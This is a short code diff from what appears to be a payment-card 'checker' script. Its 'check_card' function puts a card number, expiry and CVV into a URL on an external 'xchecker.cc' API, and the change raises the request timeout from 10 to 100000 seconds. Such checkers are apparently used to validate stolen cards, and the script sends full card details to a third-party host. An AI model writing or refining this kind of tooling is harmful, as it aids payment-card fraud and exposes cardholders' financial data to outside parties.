@@ -14,7 +14,7 @@ def check_card(card):
             yy = yy[-2:]
 
         url = f"https://xchecker.cc/api.php?cc={cc}|{mm}|{yy}|{cvv}"
-        response = requests.get(url, timeout=10)
+        response = requests.get(url, timeout=100000)
         data = response.json()
 
         if "error" in data:
